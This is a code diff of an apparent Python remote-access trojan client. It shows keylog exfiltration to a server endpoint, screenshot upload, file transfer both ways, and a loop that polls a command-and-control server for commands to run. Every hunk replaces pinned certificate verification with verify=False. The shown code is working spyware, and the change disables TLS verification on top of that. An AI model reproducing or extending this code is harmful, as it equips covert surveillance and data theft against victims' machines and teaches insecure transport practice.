@@ -59,7 +59,7 @@ def get_public_ip():
 # Function to check if the server URL is active
 def is_server_url_active(url):
     try:
-        response = requests.get(url, timeout=5, verify='cert.pem')
+        response = requests.get(url, timeout=5, verify=False)
         if response.status_code == 200:
             print("Server is active and reachable.")
             return True
@@ -118,7 +118,7 @@ def register_client():
 
     try:
         # Send a POST request to the /clientRegistration endpoint
-        response = requests.post(f"{SERVER_URL}/api/clientRegistration", json=registration_data, verify='cert.pem')
+        response = requests.post(f"{SERVER_URL}/api/clientRegistration", json=registration_data, verify=False)
 
         if response.status_code == 201:
             # Server response contains the client_id and public_key
@@ -215,7 +215,7 @@ def aes_session_key_function(client_id, SERVER_URL, cert_path="cert.pem"):
         response = requests.post(
             endpoint,
             json={"encrypted_payload": encrypted_payload.hex()},  # Send as hex string
-            verify=cert_path,
+            verify=False,
             timeout=5
         )
         
@@ -335,7 +335,7 @@ def send_keylog():
                 response = requests.post(
                     SERVER_URL + '/api/keylog-exfiltration',
                     data={'payload': payload},
-                    verify='cert.pem',
+                    verify=False,
                     timeout=10
                 )
                 if response.status_code == 200:
@@ -365,7 +365,7 @@ def send_keylog():
             response = requests.post(
                 SERVER_URL + '/api/keylog-exfiltration',
                 data={'payload': payload},
-                verify='cert.pem',
+                verify=False,
                 timeout=10
             )
             if response.status_code == 200:
@@ -649,7 +649,7 @@ def get_file_as_response_from_server_and_decrypt_and_save(filename,file_path, fi
 while True:
     try:
         # Fetch command from the server every 5 seconds
-        response = requests.get(f"{SERVER_URL}/command-transmission-to-client?clientID={client_id}", timeout=5, verify='cert.pem')  # Set timeout for the request
+        response = requests.get(f"{SERVER_URL}/command-transmission-to-client?clientID={client_id}", timeout=5, verify=False)  # Set timeout for the request
         
         # Check if the response status is OK
         if response.status_code == 200:
@@ -696,7 +696,7 @@ while True:
                             f"{SERVER_URL}/api/screenshot",
                             files=screenshot_encrypted_file,
                             data={"client_id": client_id},
-                            verify='cert.pem',
+                            verify=False,
                             timeout=10
                         )
 
@@ -725,7 +725,7 @@ while True:
                 command=""
                 command_after_json_processing=""
                 # Send request to server
-                response = requests.get(f"{SERVER_URL}/api/upload-file-to-client?clientID={client_id}&filename={filename}", timeout=5, verify='cert.pem')
+                response = requests.get(f"{SERVER_URL}/api/upload-file-to-client?clientID={client_id}&filename={filename}", timeout=5, verify=False)
 
                 # Check if the response is successful
                 if response.status_code == 200:
@@ -743,7 +743,7 @@ while True:
                 command=""
                 command_after_json_processing=""
 
-                response = requests.get(f"{SERVER_URL}/api/upload-file-to-client?clientID={client_id}&server_file_path_from_client={server_file_path_for_client}", timeout=5, verify='cert.pem')
+                response = requests.get(f"{SERVER_URL}/api/upload-file-to-client?clientID={client_id}&server_file_path_from_client={server_file_path_for_client}", timeout=5, verify=False)
                 # Check if the response is successful
                 if response.status_code == 200:
                     filename = os.path.basename(server_file_path_for_client)
@@ -764,7 +764,7 @@ while True:
                 try:
                     with open(full_file_path, 'rb') as file:
                         files = {'file': (os.path.basename(full_file_path), file)}
-                        response = requests.post(f'{SERVER_URL}/api/download-files-from-client', files=files, verify='cert.pem')
+                        response = requests.post(f'{SERVER_URL}/api/download-files-from-client', files=files, verify=False)
                         print(response.text)
                 except Exception as e:
                     print(f"Error sending file: {e}")
@@ -781,7 +781,7 @@ while True:
                 # Encode the JSON string in Base64
                 encrypted_and_b64_encoded_result = base64.b64encode(encrypted_result_dictionary.encode('utf-8')).decode('utf-8')
                 print(encrypted_and_b64_encoded_result)
-                result_response = requests.post(f"{SERVER_URL}/execution-result-of-command-from-client?clientID={client_id}", data=encrypted_and_b64_encoded_result, verify='cert.pem')
+                result_response = requests.post(f"{SERVER_URL}/execution-result-of-command-from-client?clientID={client_id}", data=encrypted_and_b64_encoded_result, verify=False)
                 
                 # Check if the result was successfully sent
                 if result_response.status_code != 200:
